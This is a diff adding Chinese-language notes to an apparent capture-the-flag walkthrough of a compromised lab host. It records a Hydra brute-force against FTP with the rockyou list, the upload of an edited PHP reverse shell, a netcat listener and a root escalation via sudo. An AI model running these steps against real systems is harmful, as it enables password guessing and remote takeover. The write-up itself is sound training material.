@@ -87,9 +87,44 @@ github上有介紹 rootkit
 ###  Oh no! We've been hacked!
 - [x] Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.
 
-111
+原先知道user是jenny，用常見的word list 就用kali內建的rockyou(爆破出來密碼987654321)
+
+```
+hydra -l jenny -P /usr/wordlist/wordlist/rockyou.txt ftp://10.10.194.25
+```
 
 - [x] Change the necessary values inside the web shell and upload it to the webserver
+
+登入ftp後，將shell中的ip port改為kali環境的
+
+```
+ftp -4 10.10.194.25
+```
+
+```
+get shell.php
+```
+
+更改shell
+
+![image](https://user-images.githubusercontent.com/67756786/192473552-a278e3e2-19dd-43a8-bdb1-58c4e954d515.png)
+
+進入ftp後將shell寫上去
+
+```
+put shell2.php shell2.php
+```
 - [x] Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.
+
+```
+nc -lvnp 8888
+```
+
 - [x] Become root!
+
+發現先使用su jenny發現jenny有權限即可使用sudo su變成root
+
+
 - [x] Read the flag.txt file inside the Reptile directory
+
+進入/root下找flag.txt
